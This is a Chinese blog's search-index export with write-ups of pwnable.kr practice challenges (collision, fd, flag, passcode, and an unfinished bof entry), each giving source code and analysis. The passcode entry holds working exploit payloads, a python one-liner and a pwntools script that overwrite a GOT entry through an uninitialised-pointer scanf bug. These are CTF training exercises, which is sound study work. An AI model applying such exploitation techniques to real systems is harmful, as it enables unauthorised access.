<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwnable.kr系列刷题之02-collision</title>
    <url>/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9702-collision/</url>
    <content><![CDATA[<p> 第二题，是一道关于MD5 hash碰撞的 题目，使用ssh链接，题目详情如下:</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210806170420.png"></p>
<p>​    先链接上看看，密码guest：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210806171452.png"></p>
<p>​    还是熟悉的几个文件，col.c是包含漏洞的源码、col为编译后的文件、flag是我们要读取的文件。当前用户col对于flag依旧没有读写权限，要读取flag内容，观察col_pwn就可以发现原理和fd依旧相同，这里直接分析col.c既可，其源代码内容如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">        res += ip[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<ol>
<li>得到flag的前提是argv[1]经过运算后，能够和hashcode对应的值0x21DD09EC相匹配</li>
<li>argv[1]作为参数1，大小为20字节</li>
<li>check_password进行hash运算，函数将20字节的argv[1]拆分位一个int[5]数组进行累加运算</li>
</ol>
<p>综上，这里只需要找到一组int[5]来满足累加运算后值为0x21DD09EC即可成功破解。</p>
<p>​    这里可以考虑写程序暴力枚举破解，但对于这个简单的算法其实没必要，只需要保证五个四字节大小的数相加为hashcode即可，那么可以让前4个四字节数都为同一个值也就是参数的前16个字节都相同，比如设为0x0(这里不能为0x00，应为0x00会截断参数输入，其它任何数都可以)，那么最后一个四字节数就可以通过0x21DD09EC-0x05050505*4算出来为0x0DC8F5D8。</p>
<p>​    输入参数需要手动键入的话，很多非字母、数字和符号的ASCII字符是打不出来的，这就需要掌握点技巧，一个方法就是使用python这样的脚本对字符进行输出然后直接作为参数进行漏洞程序执行。使用python构建参数为如下形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`python2 -c <span class="string">&quot;print &#x27;\x05\x05\x05\x05&#x27;*0x4+&#x27;\xd8\xf5\xc8\x0d&#x27;&quot;</span>`</span><br></pre></td></tr></table></figure>

<p>​    然后我们进行验证，python2成功flag，这里不建议使用python3：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810145648.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux - pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之01-fd</title>
    <url>/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9701-fd/</url>
    <content><![CDATA[<p><strong>题目：</strong></p>
<p>​    该题是第一道题，通过描述来看是和Linux描述符相关的题目，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210730162821.png"></p>
<p>​    首先使用ssh远程链接linux服务器，括号中为密码guest，链接后如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210730163010.png"></p>
<p>​    查看文件，其中用于登录的fd用户，对于flag并无任何读写权限，而可以可能到fd对于fd.c具有读取权限，所以我们可以查看fd.c的代码进行漏洞利用来获取flag信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210730170620.png"></p>
<p>​    fd.c代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ol>
<li> fd通过参数(argv[1])-0x1234来计算得到</li>
<li> fd控制read读取到buf的内容，read函数限定了向buf中写入的内容为32字节，没有利用的可能</li>
<li> 通过buf的内容和”LERMEWIN”做比较来cat flag得到flag内容，这里存在一个问题，刚才看到权限的时候，flag并没有权限去读取，为什么运行fd之后，就可以cat flag了。这是应为fd和flag都有着同个所有用户fd_pwn，当fd运行起来后，其本身对应的权限就临时会变为fd_pwn，而fd_pwn对于flag是有读取权限的，所以就可以cat flag了。</li>
</ol>
<p> <strong>文件描述符</strong></p>
<p>参考<a href="https://zhuanlan.zhihu.com/p/376099115">Linux 下 C/C++ 输入输出</a></p>
<p>​    观察代码，这里在分析前需要先了解点Linux下文件描述符的知识，在Linux下启动一个程序时，会打开三个文件描述符0、1、2，Linux内核会管理文件描述符及其背后的文件是什么，所以可以使用<strong>系统调用</strong><code>read/write</code>往0、1、2这三个文件描述符里读取/写入内容，这三个文件描述符一般都会链接到终端屏幕上。可以在终端数如tty命令来查看自己终端所绑定的输出位置，也可以使用<code>ls -l /proc/进程pid/fd</code>来查看具体进程打开的所有fd，可以看到很多程序的并没有链接到终端中，而是连接到了文件/套接字中。单无论是输入/输出, 其最终都是要通过系统调用, 读取 0 号 fd, 或者写入 1/2 号 fd。</p>
<p>​    在C标准输入输出中，为了尽可能不进行系统调用，大佬们想出了缓存，也就是常说的<code>stdin</code>、<code>stdout</code>、<code>stderr</code>，这三个东西在C标准库中实现，实际上对应的是<code>FILE*</code>，分别指向了C标准库种得<code>_IO_2_1_stdin_, _IO_2_1_stdout_, _IO_2_1_stderr_</code>这三个FILE，这三个FILE主要就是用来负责管理缓存然后在需要的时候进行<code>read/write</code>系统调用，得到新的输入或者进行真正的输出。</p>
<p><strong>继续分析：</strong></p>
<p>​    了解了文件描述符的知识后，我们继续看fd程序，可以发现要拿到flag的前提是buf内容为LETEMEWIN，而我们唯一能控制输入的地方在控制台，所以read用到的fd就需要代表终端才能将需要的内容写入buf。所以就要使得fd为stdin也就是0，那么第一个参数argv[1]就要为0x1234也就是字符串”4006”。</p>
<p>​    分析完毕后进行验证，成功得到flg：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210805182143.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux - pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之04-flag</title>
    <url>/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9704-flag/</url>
    <content><![CDATA[<p>这道题看描述是一道CTF  reverse题，主要是考验动静结合的逆向能力，不同于pwn：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810161746.png"></p>
<p>​    wget下载下来，顺便查看flag文件类型，为64位elf文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810162520.png"></p>
<p>​    运行后提示：I will malloc() and strcpy the flag there. take it.</p>
<p>​    先静态分析一下，程序被加了upx壳，</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810191238.png"></p>
<p>​    将其脱壳再拖入IDA分析，代码很简单一目了然，跟进flag即可拿到对应的flag为：<strong>UPX…? sounds like a delivery service</strong> </p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810192307.png"></p>
<p>​    这里也可以gdb动态调试一下脱壳后的样本，在strcpy处(0x401195)设置断点，然后查看esi中对应字符串内容：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810194608.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810194826.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux - pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之05-passcode</title>
    <url>/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9705-passcode/</url>
    <content><![CDATA[<p>这道题目，从描述来看说是写了一个密码登录系统，编译时有warning无error，题目信息如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811101230.png"></p>
<p>​    还是通过ssh链接查看题目内容，ssh <a href="mailto:&#112;&#x61;&#x73;&#x73;&#99;&#x6f;&#x64;&#101;&#64;&#112;&#x77;&#x6e;&#x61;&#98;&#x6c;&#x65;&#46;&#x6b;&#x72;">&#112;&#x61;&#x73;&#x73;&#99;&#x6f;&#x64;&#101;&#64;&#112;&#x77;&#x6e;&#x61;&#98;&#x6c;&#x65;&#46;&#x6b;&#x72;</a> -p2222 (pw:guest)，题目里的东西还是老几样，重点关注文件权限：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811104304.png"></p>
<p>​    然后查看passcode.c源码，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<ol>
<li>从能成功flag处逆着看，首先要满足两个条件passcode1和psscode2的值为两个给定的值338150(0x528e6)和13371337(0xcc07c9)</li>
<li>passcode1和passcode2通过scanf()输入，但是这里程序写错，未使用&amp;来取变量地址，所以会把这两个变量的值直接作为地址来存储输入的内容，两个变量初始化时未赋值，所以值是随机的</li>
<li>要想利用，那么就要想办法覆盖passcode1和passcode2的值，来控制scanf()对任意地址写入数据。</li>
</ol>
<p><strong>解法思路：</strong></p>
<ol>
<li><p>welcome()和login()是两个连续调用的函数，所以对于栈空间的利用是会有部分重叠的，name限定了100字节的大小，可以考虑是否可以在这100个字节内修改道passcode1和passcode2的初始值，使其变得不随机。</p>
<p>这里先把passcode通过pwntools下载到本地进行调试(passcode.c和passcode有读取权限，而flag没有，所以想直接下载flag到本地是不可以的)，利用到的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	shell = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,port=<span class="number">2222</span>,password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">	shell.download_file(<span class="string">&#x27;passcode&#x27;</span>)</span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>   下载后进行调试，已经分析过了，所以这里直接查看welcode和login反编译，查看到name和passcode1、passcode2的位置来计算偏移即可：</p>
<p>   welcode():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function welcome:</span><br><span class="line">   0x08048609 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x0804860a &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x0804860c &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">   0x08048612 &lt;+9&gt;:	mov    eax,gs:0x14</span><br><span class="line">   0x08048618 &lt;+15&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x0804861b &lt;+18&gt;:	xor    eax,eax</span><br><span class="line">   0x0804861d &lt;+20&gt;:	mov    eax,0x80487cb</span><br><span class="line">   0x08048622 &lt;+25&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048625 &lt;+28&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x0804862a &lt;+33&gt;:	mov    eax,0x80487dd</span><br><span class="line">   0x0804862f &lt;+38&gt;:	lea    edx,[ebp-0x70]</span><br><span class="line">   0x08048632 &lt;+41&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x08048636 &lt;+45&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048639 &lt;+48&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804863e &lt;+53&gt;:	mov    eax,0x80487e3</span><br><span class="line">   0x08048643 &lt;+58&gt;:	lea    edx,[ebp-0x70]</span><br><span class="line">   0x08048646 &lt;+61&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x0804864a &lt;+65&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804864d &lt;+68&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048652 &lt;+73&gt;:	mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x08048655 &lt;+76&gt;:	xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x0804865c &lt;+83&gt;:	je     0x8048663 &lt;welcome+90&gt;</span><br><span class="line">   0x0804865e &lt;+85&gt;:	call   0x8048440 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x08048663 &lt;+90&gt;:	leave  </span><br><span class="line">   0x08048664 &lt;+91&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>​    login()：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function login:</span><br><span class="line">   0x08048564 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x08048565 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048567 &lt;+3&gt;:	sub    esp,0x28</span><br><span class="line">   0x0804856a &lt;+6&gt;:	mov    eax,0x8048770</span><br><span class="line">   0x0804856f &lt;+11&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048572 &lt;+14&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048577 &lt;+19&gt;:	mov    eax,0x8048783</span><br><span class="line">   0x0804857c &lt;+24&gt;:	mov    edx,DWORD PTR [ebp-0x10]</span><br><span class="line">   0x0804857f &lt;+27&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x08048583 &lt;+31&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048586 &lt;+34&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804858b &lt;+39&gt;:	mov    eax,ds:0x804a02c</span><br><span class="line">   0x08048590 &lt;+44&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048593 &lt;+47&gt;:	call   0x8048430 &lt;fflush@plt&gt;</span><br><span class="line">   0x08048598 &lt;+52&gt;:	mov    eax,0x8048786</span><br><span class="line">   0x0804859d &lt;+57&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080485a0 &lt;+60&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x080485a5 &lt;+65&gt;:	mov    eax,0x8048783</span><br><span class="line">   0x080485aa &lt;+70&gt;:	mov    edx,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080485ad &lt;+73&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x080485b1 &lt;+77&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080485b4 &lt;+80&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x080485b9 &lt;+85&gt;:	mov    DWORD PTR [esp],0x8048799</span><br><span class="line">   0x080485c0 &lt;+92&gt;:	call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485c5 &lt;+97&gt;:	cmp    DWORD PTR [ebp-0x10],0x528e6</span><br><span class="line">   0x080485cc &lt;+104&gt;:	jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485ce &lt;+106&gt;:	cmp    DWORD PTR [ebp-0xc],0xcc07c9</span><br><span class="line">   0x080485d5 &lt;+113&gt;:	jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485d7 &lt;+115&gt;:	mov    DWORD PTR [esp],0x80487a5</span><br><span class="line">   0x080485de &lt;+122&gt;:	call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485e3 &lt;+127&gt;:	mov    DWORD PTR [esp],0x80487af</span><br><span class="line">   0x080485ea &lt;+134&gt;:	call   0x8048460 &lt;system@plt&gt;</span><br><span class="line">   0x080485ef &lt;+139&gt;:	leave  </span><br><span class="line">   0x080485f0 &lt;+140&gt;:	ret    </span><br><span class="line">   0x080485f1 &lt;+141&gt;:	mov    DWORD PTR [esp],0x80487bd</span><br><span class="line">   0x080485f8 &lt;+148&gt;:	call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485fd &lt;+153&gt;:	mov    DWORD PTR [esp],0x0</span><br><span class="line">   0x08048604 &lt;+160&gt;:	call   0x8048480 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>​    从反编译的代码中，可以看到name和passcode1相对于ebp的偏移分别为ebp-0x70、ebp-0x10。因为栈空间是平衡的，所以进入welcome()和login()后，ebp的位置在程序栈空间中都是一个地址。那么很容易我们可以在赋值name时先填充0x60的数据比如’A’，然后填充一个想要去赋值的四字节地址，就可以达到对任意地址的写入了。</p>
<p>​    接着分析，这种情况下就考虑直接去GOT中替换程序中用到的某个函数比如fflush()，即把passcode1替换为fflush()的地址，然后在scanf(“%d”,passcode1)时输入printf(“Login OK!\n”)所在地址，然后call fflush()时就可以直接跳过验证流程cat flag。</p>
<p>​    查看一下passcode开启的保护，并未开启NX，那就可以直接查地址使用即可，不用再leaklibc了：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811184424.png"></p>
<p>​    oledump找到fflush()地址：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185545.png"></p>
<p>​    构造exp，两种方式利用：</p>
<ul>
<li>ssh直接链接利用：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">python2 -c <span class="string">&quot;print &#x27;A&#x27;*0x60+&#x27;\x04\xa0\x04\x08&#x27;+str(0x080485d7)&quot;</span> | ./passcode</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185732.png"></p>
<ul>
<li>使用pwntools利用：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	shell = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,port=<span class="number">2222</span>,password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">	fflushAddr = <span class="number">0x0804a004</span></span><br><span class="line">	loginAddr = <span class="number">0x080485d7</span></span><br><span class="line">	p = shell.process(<span class="string">&#x27;passcode&#x27;</span>)</span><br><span class="line">	payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span> + p32(fflushAddr)+<span class="built_in">str</span>(loginAddr)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185827.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux - pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之03-bof</title>
    <url>/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9703-bof/</url>
    <content><![CDATA[<p>  通过该题的下载链接下载到源码和编译后的程序，提示如下： </p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability.</span><br><span class="line">Is that true?</span><br><span class="line"> </span><br><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br><span class="line"> </span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure>

<p>​    题目代码如下 bof.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">    gets(overflowme);    <span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    是一个很简单的栈溢出漏洞，把key的值替换为0xcagebabe即可成功flag，但是第一次使用gdb+pwotools来做题时，还是对一些分析流程以及偏移的计算不太熟练，尝试了很多次。</p>
<p>​    拿到程序先用checksec来查看一下启用的保护，因为是练手程序，所以基本上所有保护都被关闭了，只开启了RELRO(只读保护)，对栈利用无影响:</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn20210729180341.png"></p>
<p>接下来就是调试算偏移，file加载bof到gdb，break func对存在溢出点的函数下断，run执行，成功断到func入口处，有两种算偏移的方法，如果熟悉汇编代码可以直接通过disassemble对func函数反编译，通过代码计算栈偏移即可，反编译后代码如下：</p>
